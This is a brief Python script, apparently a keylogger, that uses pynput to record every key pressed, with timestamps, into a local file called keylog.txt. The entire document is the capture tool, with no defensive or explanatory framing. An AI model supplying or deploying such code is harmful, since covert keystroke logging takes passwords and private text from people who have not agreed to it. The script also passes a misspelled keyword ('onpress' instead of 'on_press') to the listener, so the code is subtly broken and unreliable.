import pynput
from pynput.keyboard import Key, Listener
import logging

#path for storing the text file
log_dir=r""
logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format="%(asctime)s:%(message)s")

def onpress(key):
    logging.info(str(key))

with Listener( onpress = onpress ) as listener:
     listener.join()